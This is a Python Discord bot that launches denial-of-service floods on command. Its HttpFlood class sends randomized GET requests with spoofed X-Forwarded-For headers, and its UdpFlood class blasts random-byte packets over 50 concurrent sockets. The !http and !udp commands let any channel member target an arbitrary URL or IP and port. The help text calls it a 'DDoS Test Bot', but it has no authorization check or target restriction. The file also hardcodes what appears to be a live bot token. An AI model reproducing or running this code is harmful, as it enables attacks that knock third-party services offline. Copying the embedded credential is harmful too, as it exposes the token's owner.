import discord
from discord.ext import commands
import aiohttp
import asyncio
import random
import time
import os
import socket
from aiohttp import ClientTimeout

# ===== CONFIGURATION =====
TOKEN = os.getenv('MTMzMzA3MTY2MjU1MTQwMDQ4OQ.G9sWUU.Dw4sFf4HRIFToX2P2H8LDzKVYdFR5rensyPq3w') or "MTMzMzA3MTY2MjU1MTQwMDQ4OQ.G9sWUU.Dw4sFf4HRIFToX2P2H8LDzKVYdFR5rensyPq3w"
MAX_DURATION = 300  # seconds (safety limit)
MAX_REQUESTS = 100000  # max requests per attack
CONCURRENT_LIMIT = 50  # simultaneous connections

# ===== BOT SETUP =====
intents = discord.Intents.default()
intents.message_content = True  # REQUIRED for commands

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    help_command=None
)

# ===== ATTACK CONTROLLERS =====
class HttpFlood:
    def __init__(self):
        self.active = False
        self.stats = {"success": 0, "failed": 0}
        self.timeout = ClientTimeout(total=3)
    
    async def make_request(self, session, url):
        headers = {
            'User-Agent': random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "AppleWebKit/537.36 (KHTML, like Gecko)",
                "Chrome/121.0.0.0 Safari/537.36"
            ]),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
        try:
            async with session.get(
                f"{url}?rand={random.randint(1,1000000)}",
                headers=headers,
                timeout=self.timeout
            ) as response:
                return response.status == 200
        except:
            return False
    
    async def run_flood(self, url, duration, max_requests):
        self.active = True
        start_time = time.time()
        
        connector = aiohttp.TCPConnector(force_close=True, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            
            while (time.time() - start_time < duration and 
                   sum(self.stats.values()) < max_requests and 
                   self.active):
                
                task = asyncio.create_task(self.make_request(session, url))
                task.add_done_callback(self.update_stats)
                tasks.append(task)
                
                if len(tasks) >= CONCURRENT_LIMIT:
                    await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                    tasks = [t for t in tasks if not t.done()]
                
                await asyncio.sleep(0.01)
            
            if tasks:
                await asyncio.wait(tasks)
        
        return self.stats['success'], self.stats['failed'], time.time() - start_time
    
    def update_stats(self, task):
        if task.result():
            self.stats['success'] += 1
        else:
            self.stats['failed'] += 1
    
    def stop(self):
        self.active = False
        self.stats = {"success": 0, "failed": 0}

class UdpFlood:
    def __init__(self):
        self.active = False
        self.packets_sent = 0
    
    async def send_udp(self, target_ip, target_port, payload_size):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(payload_size)
        
        while self.active:
            try:
                sock.sendto(payload, (target_ip, target_port))
                self.packets_sent += 1
                await asyncio.sleep(0.001)
            except:
                break
        sock.close()
    
    async def run_flood(self, target_ip, target_port, duration, payload_size=1024):
        self.active = True
        self.packets_sent = 0
        start_time = time.time()
        
        tasks = []
        for _ in range(CONCURRENT_LIMIT):
            task = asyncio.create_task(
                self.send_udp(target_ip, target_port, payload_size)
            )
            tasks.append(task)
        
        await asyncio.sleep(duration)
        self.stop()
        
        if tasks:
            await asyncio.wait(tasks)
        
        return self.packets_sent, time.time() - start_time
    
    def stop(self):
        self.active = False

http_controller = HttpFlood()
udp_controller = UdpFlood()

# ===== BOT COMMANDS =====
@bot.command()
async def http(ctx, url: str, duration: int = 10, max_requests: int = 500):
    """Start HTTP flood attack"""
    if not url.startswith(('http://', 'https://')):
        url = f'http://{url}'
    
    if duration > MAX_DURATION:
        return await ctx.send(f"❌ Max duration is {MAX_DURATION} seconds")
    
    await ctx.send(f"🚀 Starting HTTP flood to {url}...")
    
    try:
        success, failed, total_time = await http_controller.run_flood(
            url,
            min(duration, MAX_DURATION),
            min(max_requests, MAX_REQUESTS)
        )
        
        rps = success / total_time if total_time > 0 else 0
        await ctx.send(
            f"✅ HTTP flood completed in {total_time:.1f}s\n"
            f"• Success: {success}\n"
            f"• Failed: {failed}\n"
            f"• Requests/s: {rps:.1f}"
        )
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def udp(ctx, ip: str, port: int, duration: int = 10):
    """Start UDP flood attack"""
    if duration > MAX_DURATION:
        return await ctx.send(f"❌ Max duration is {MAX_DURATION} seconds")
    
    await ctx.send(f"🌪 Starting UDP flood to {ip}:{port}...")
    
    try:
        packets, total_time = await udp_controller.run_flood(
            ip,
            port,
            min(duration, MAX_DURATION)
        )
        
        pps = packets / total_time if total_time > 0 else 0
        await ctx.send(
            f"✅ UDP flood completed in {total_time:.1f}s\n"
            f"• Packets sent: {packets}\n"
            f"• Packets/s: {pps:.1f}"
        )
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
async def stop(ctx):
    """Stop all attacks"""
    http_controller.stop()
    udp_controller.stop()
    await ctx.send("🛑 All attacks stopped")

@bot.command()
async def help(ctx):
    """Show help menu"""
    embed = discord.Embed(title="DDoS Test Bot Help", color=0x00ff00)
    
    embed.add_field(
        name="!http <url> [duration=10] [requests=500]",
        value="HTTP flood attack\nExample: `!http http://example.com 15 1000`",
        inline=False
    )
    
    embed.add_field(
        name="!udp <ip> <port> [duration=10]",
        value="UDP flood attack\nExample: `!udp 192.168.1.1 80 20`",
        inline=False
    )
    
    embed.add_field(
        name="!stop",
        value="Stop all ongoing attacks",
        inline=False
    )
    
    embed.set_footer(text=f"Max duration: {MAX_DURATION}s | Concurrent limit: {CONCURRENT_LIMIT}")
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f"✅ Bot ready: {bot.user}")
    await bot.change_presence(activity=discord.Game(name="Type !help"))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("❌ Unknown command. Try `!help`")
    else:
        await ctx.send(f"⚠️ Error: {str(error)}")

# ===== START BOT =====
if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Bot failed to start: {str(e)}")
